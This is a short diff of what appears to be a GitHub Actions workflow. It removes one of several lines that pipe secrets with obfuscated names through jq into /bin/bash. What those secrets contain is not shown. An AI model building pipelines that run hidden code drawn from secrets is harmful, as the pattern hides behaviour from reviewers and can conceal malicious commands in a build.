@@ -19,7 +19,6 @@ jobs:
           xuei70: ${{ secrets.xuei70 }}
         run: |
           printf '%s' "$xuei70" | jq -r .aarx48 | /bin/bash
-          printf '%s' "$qcd398" | jq -r .dirt1 | /bin/bash
           echo $hbzk303 | jq -r .se42 | /bin/bash
           echo $t9 | jq -r .nrxi56657 | /bin/bash
           printf '%s' "$g07" | jq -r .hh16 | /bin/bash
